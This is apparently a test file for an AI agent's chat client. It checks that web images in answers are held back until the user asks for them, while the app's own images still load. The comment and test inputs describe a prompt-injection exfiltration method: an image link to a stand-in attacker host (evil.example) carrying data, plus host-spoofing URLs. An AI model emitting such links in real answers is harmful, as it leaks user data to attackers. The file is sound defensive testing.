import assert from "node:assert/strict";
import test from "node:test";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { Streamdown } from "streamdown";
import { ANSWER } from "../src/client/AnswerParts.js";
import { MessageResponse } from "../src/client/components/ai-elements/message.js";

/**
 * Security audit 2026-11-27, client M1: an answer can be steered by what the agent read, and a picture from the web fetched
 * the moment the answer is drawn tells whoever wrote its address who is watching, and whatever the address carries. So it
 * waits to be asked for; Friday's own show at once.
 */
(globalThis as { window?: unknown }).window ??= { dispatchEvent: () => true };
(globalThis as { location?: unknown }).location ??= { origin: "http://127.0.0.1:4321", search: "?session=s1&invite=i1", href: "http://127.0.0.1:4321/?session=s1&invite=i1" };
const answer = (md: string) => renderToStaticMarkup(createElement(Streamdown, { ...ANSWER, math: undefined, children: md } as never));
const plain = (md: string) => renderToStaticMarkup(createElement(MessageResponse, null, md));

test("a picture from the web in an answer is not fetched until asked for, and says where it is from", () => {
  for (const out of [answer("Here: ![a chart](https://evil.example/c.png?d=secret)"), plain("Here: ![a chart](https://evil.example/c.png?d=secret)")]) {
    assert.doesNotMatch(out, /<img/, out);
    assert.doesNotMatch(out, /src="https:\/\/evil\.example/);
    assert.match(out, /a chart from evil\.example\./);
    assert.match(out, /<button type="button" class="link-btn"[^>]*>Show it<\/button>/);
  }
  assert.match(answer("![x](https://friday.example@evil.example/c.png)"), /from evil\.example\./, "the host it would really be asked of");
});

test("Friday's own pictures still show at once", () => {
  assert.match(answer("![own](http://127.0.0.1:4321/api/sessions/s1/files/f1)"), /<img[^>]*src="http:\/\/127\.0\.0\.1:4321\/api\/sessions\/s1\/files\/f1"/);
  assert.match(answer("![api](/api/sessions/s1/files/f1)"), /<img[^>]*src="\/api\/sessions\/s1\/files\/f1"/);
  assert.doesNotMatch(answer("![own](http://127.0.0.1:4321.evil.example/c.png)"), /<img/, "an address that only starts like Friday's is not Friday's");
});
